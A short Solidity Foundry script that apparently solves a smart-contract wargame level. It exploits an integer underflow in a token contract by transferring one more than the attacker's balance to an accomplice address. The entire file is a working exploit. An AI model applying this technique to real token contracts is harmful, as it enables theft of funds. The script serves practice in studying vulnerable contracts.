// SDPX-License-Identifier: MIT

pragma solidity ^0.6.2;

import {Script} from "forge-std/Script.sol";

import {Constants} from "./Constants.s.sol";

interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
    function balanceOf(address _owner) external view returns(uint256);
}

contract TokenAttacker is Constants, Script {

    function run() public {
        IToken victim = IToken(TOKEN_ADDRESS);
        attack(victim);
    }
    
    function attack(IToken victim) private {
        uint256 balance = victim.balanceOf(ATTACKER_ADDRESS);

        vm.startBroadcast(ATTACKER_ADDRESS);
        victim.transfer(ACCOMPLICE_ADDRESS, balance + 1);
    }
}